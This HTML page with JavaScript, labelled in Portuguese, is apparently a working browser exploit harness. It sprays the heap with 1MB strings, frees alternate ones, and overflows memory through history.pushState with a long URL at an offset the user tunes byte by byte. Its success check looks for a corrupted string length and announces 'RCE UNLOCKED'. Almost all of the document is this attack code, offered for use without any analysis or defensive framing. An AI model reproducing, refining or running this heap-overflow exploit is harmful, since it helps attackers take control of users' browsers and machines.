<!DOCTYPE html>
<html>
<head>
    <title>Precision Sniper (1MB String)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
        input { font-size: 30px; padding: 10px; width: 200px; text-align: center; background: #222; color: #fff; border: 2px solid #0f0; }
        button { font-size: 24px; padding: 15px; margin: 10px; cursor: pointer; width: 45%; background: #111; color: #fff; border: 1px solid #555; }
        .fire { background-color: #b00; color: #fff; border-color: red; width: 95%; font-weight: bold; }
        #log { margin-top: 20px; border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; color: cyan; text-align: left;}
        .win { background-color: #0f0; color: #000; font-weight: bold; font-size: 1.5em; border: 4px solid white; padding: 10px;}
        .hit { color: yellow; }
    </style>
</head>
<body>

    <h1>Precision Sniper: 1MB String</h1>
    <p>Alvo: Achar o 'Length' recuando byte a byte.</p>

    <div>
        OFFSET ATUAL: <br>
        <input type="number" id="offsetInput" value="709520">
    </div>
    
    <br>
    <button onclick="adjust(-1)">-1 Byte</button>
    <button onclick="adjust(-4)">-4 Bytes</button>
    <button onclick="adjust(-8)">-8 Bytes</button>
    <button onclick="adjust(-16)">-16 Bytes</button>
    <br><br>
    <button class="fire" onclick="fire()">DISPARAR NESTE OFFSET</button>

    <div id="log">Pronto. Último sucesso (DADOS) foi em 709520.</div>

    <script>
        const OVERFLOW_AMT = 1024 * 64; 

        // Configuração VENCEDORA (1MB TextDecoder)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let style = type === 'win' ? 'class="win"' : (type === 'hit' ? 'class="hit"' : '');
            el.innerHTML = `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>` + el.innerHTML;
        }

        function adjust(amount) {
            let el = document.getElementById('offsetInput');
            el.value = parseInt(el.value) + amount;
        }

        async function fire() {
            let offset = parseInt(document.getElementById('offsetInput').value);
            log(`----------------------------------------`);
            log(`PREPARANDO ATAQUE NO OFFSET: ${offset}...`);

            // 1. Limpeza
            victims = [];
            await forceGC();

            try {
                // 2. SPRAY (A estratégia que funcionou)
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); // 'B'
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                for(let i=0; i<80; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // 3. BURACOS
                for(let i=0; i<80; i+=2) victims[i] = null;
                await forceGC();

                // 4. EXPLOIT
                log("Injetando...");
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(offset);
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "sniper", "/" + buffer);

                        checkResult(offset);

                    } catch (e) {
                        log("Erro JS: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro memória: " + e.message);
            }
        }

        function checkResult(offset) {
            let found = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // CASO 1: LENGTH (VITÓRIA)
                    if (msg.length !== PAYLOAD_SIZE) {
                        log(`!!! JACKPOT !!! Length Corrompido!`, 'win');
                        log(`Offset Vencedor: ${offset}`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert(`RCE UNLOCKED NO OFFSET ${offset}!`);
                        found = true;
                        break;
                    }

                    // CASO 2: DADOS (QUASE)
                    if (msg.charCodeAt(0) === 1) {
                        log(`[${offset}] Atingiu DADOS. Recue mais.`, 'hit');
                        found = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!found) log(`[${offset}] Nada atingido (Isolamento ou desalinhamento).`);
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 400));
        }
    </script>
</body>
</html>
